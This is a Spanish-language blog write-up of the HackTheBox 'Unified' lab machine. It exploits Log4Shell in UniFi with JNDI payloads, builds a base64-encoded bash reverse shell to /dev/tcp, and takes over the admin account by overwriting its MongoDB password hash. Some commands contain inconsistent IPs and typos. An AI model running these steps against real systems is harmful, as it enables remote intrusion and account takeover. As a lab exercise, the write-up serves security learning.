---
layout: post
title: "Write Up Unified. "
subtitle: "Starting-Point"
category: Blog
tags: [Easy,Genin,Linux,HTB,Web,Vulnerability-Assessment,Database,Injection,Custom-Applications,Outdated-Software,MongoDB,Java,Reconnaissance,Clear-Text-Credentials,Default-Credentials,Code-Injection,eJPTv2]
image:
  path: /assets/img/unified/unified.png
---

***

<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconnaissance

### nmap

Utilizando **nmap**, comprobamos qué puertos están abiertos.

```bash
nmap --open -p- -Pn -n -T4 -vvv -n 10.129.130.89 -oN allports
```

![list](/assets/img/oopsie/nmap.png){:.lead width="800" height="100" loading="lazy"}

***

### Services and Versions

```bash
nmap -sVC -Pn -n -p22,6789,8080,8443,8843,8880 10.129.130.89 -oN target
```

![list](/assets/img/oopsie/SERVICE.png){:.lead width="800" height="100" loading="lazy"}


***

## Vulnerability Analysis 

### HTTP TCP-8080 => 8443

Tenemos varios puertos abiertos pero el que vamos a revisar es el 8080 pero este a su ves nos redirigue al 8443 por lo que nos vemos obligados a tratar este servicio que se llamada **Unifi** que esta en su version 6.4.54 el cual podemos buscar en internet un exploit, pero esta ves lo vamos hacer de una forma mas manual, por lo que primero vamos a interceptar la comunicacion con **Burpsuite** a la hora de loggearnos, como no tenemos credenciales validas bvaamos a usar unas cualquiera, y una ves en bursuite vamos aprobar el campo vulnerable con `${jndi:ldap://10.129.130.89/test}`.

> Es una vulnerabilidad crítica en Log4J, conocida como CVE-2021-44228 o Log4Shell. Esta vulnerabilidad permite la ejecución remota de código en aplicaciones que utilizan Log4J, lo que puede llevar a ataques y compromisos de seguridad significativos. La vulnerabilidad de Log4J ha generado una gran atención y preocupación en la comunidad de seguridad informática, y se han tomado medidas urgentes para solucionarla y mitigar su impacto.


![list](/assets/img/unified/8443.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Uso de Wappalizer.


![list](/assets/img/unified/intercep.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
El parametro vulnerablees remenber.


Si nos ponemos a la escucha con netcat y si la solicitud hace que el servidor se conecte de vuelta a nosotros, entonces hemos verificado que la aplicación es vulnerable.

Después de hacer clic en **enviar**, el panel de **Respuesta** mostrará la respuesta de la solicitud. La salida nos muestra un mensaje de **error** que indica que la carga útil es inválida, pero a pesar del mensaje de error, la carga útil se está ejecutando en realidad.

Procedamos a iniciar tcpdump en el puerto 389, que monitoreará el tráfico de red para las conexiones **LDAP**.

Abre otra terminal y escribe:

```bash
sudo tcpdump -i eth0 -n port 389
```


![list](/assets/img/unified/burp-request.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Con esto ya tenemos coneccion.

***
## Exploitation

Para construir una carga útil que podamos enviar al servidor y que nos proporcione **Ejecución Remota de Código** en el sistema vulnerable, tendremos que instalar **Open-JDK** y **Maven** en nuestro sistema.


```bash
sudo apt-get update && apt-get install openjdk-11-jdk && apt-get install maven -y
```


Open-JDK es el kit de desarrollo de Java que se utiliza para construir aplicaciones Java. Por otro lado, Maven es un Entorno de Desarrollo Integrado (IDE) que se puede utilizar para crear un proyecto estructurado y compilar nuestros proyectos en archivos jar, estas aplicaciones también nos ayudarán a ejecutar la aplicación [Java rogue-jndi] que debemos clonar el repositorio, que inicia un servidor LDAP local y nos permite recibir conexiones desde el servidor vulnerable y ejecutar código malicioso.

[Java rogue-jndi]: https://github.com/veracode-research/rogue-jndi

Clonemos el repositorio correspondiente y construyamos el paquete utilizando Maven:


```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```


Esto creará un archivo **.jar** en el directorio **rogue-jndi/target/** llamado **RogueJndi-1.1.jar**. Ahora podemos construir nuestra carga útil para pasarla a la aplicación Java RogueJndi-1.1.jar.

Segundo debemos construir una carga útil que será responsable de proporcionarnos una shell en el sistema afectado. Codificaremos la carga útil en **Base64** para evitar problemas de codificación.


```bash
echo 'bash -c bash -i >&/dev/tcp/10.129.130.89/443 0>&1' | base64
 ```


![list](/assets/img/oopsie/upload.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Creamos el payload.


Tercero nos ponemos a la escucha con netcat en el puerto 443 para recibir la shell y ejecutamos el siguiente comando.


```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,A qui va tu hash} |{base64,-
d}|{bash,-i}" --hostname "10.10.120.89"
 ```


![list](/assets/img/unified/unifi.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Con esto ya estamos a la escucha con el servidor y con el listener ahora debemos volber a Burpsuite.


Volviendo a nuestra solicitud POST interceptada, cambiemos la carga útil a `${jndi:ldap://10.129.130.89/o=tomcat}},` y luego pulsamos en enviar, u una vez que recibimos la salida del servidor Rogue, se genera una shell en nuestro listener de Netcat.


{.note}
La flag esta en el directorio del usuario michael.


***

## Privilege Escalation

Como en otra ocasiones subiremos el binario LimEnum.sh, o el comado ps aux para ver los procesos del servido y eureka encontramos un proceso de mongoque se está ejecutando en el sistema objetivo en el puerto **27117**.
Interactuemos con el servicio de MongoDB utilizando la utilidad de línea de comandos de mongo e intentemos extraer la contraseña del administrador. 


![list](/assets/img/unified/mongo.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Proceso.


Una rápida búsqueda en Google utilizando las palabras clave **UniFi Default Database** muestra que el nombre predeterminado de la base de datos para la aplicación UniFi es **ace**.


```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`
```


![list](/assets/img/unified/mod.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Esto nos devuelve un hash del usuario Administrador.


La salida revela un hash de contraseña se encuentra en la variable **x_shadow**, pero en este caso no se puede descifrar con ninguna utilidad de descifrado de contraseñas. En su lugar, podemos cambiar el hash de contraseña de **x_shadow** con nuestro propio hash creado para reemplazar la contraseña del administrador y autenticarnos en el panel administrativo. Para hacer esto, podemos utilizar la utilidad de línea de comandos **mkpasswd**.


![list](/assets/img/unified/mk.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Creamos un hash de contraseña **Password1234**.


Tambien loara comprobar que estamos ahaciendo bien podemos ver los dato del administrado con el siguiente comado.


```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`
```


![list](/assets/img/unified/admin.png){:.lead width="800" height="100" loading="lazy"}

Ahora con el hash que creamos reemplazamos por el de administrador que no sabemos.


```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("tu hash aki")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'
```


![list](/assets/img/unified/mod.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Esto cambiara la contraseña a **Password1234** podemos volver a  comprovar para aseguranos que si cambio.


Ahora podemos ir a la web e introducir esas credenciales en el formulario de login y **Voilà** tenemos acceso ya aqui es husmear la web en configuracion encontramos una credenciales que probaremos en el servicio **ssh**.


![list](/assets/img/unified/login.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Las credenciales son validads.


```bash
ssh root@10.129.130.89
```


![list](/assets/img/unified/flagr.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
La flag esta en el escritorio del usuario root.



***

```bash
🎉 Felicitaciones ya has comprometido Unified de HackTheBox 🎉
```
{:.centered}

***

Back to [Starting-Point](2023-02-02-Starting-Point.md){:.heading.flip-title}
{:.read-more}

***
Back to [Certification eJPTv2 ](2023-06-02-Road-to-eJPTv2.md){:.heading.flip-title}
{:.read-more}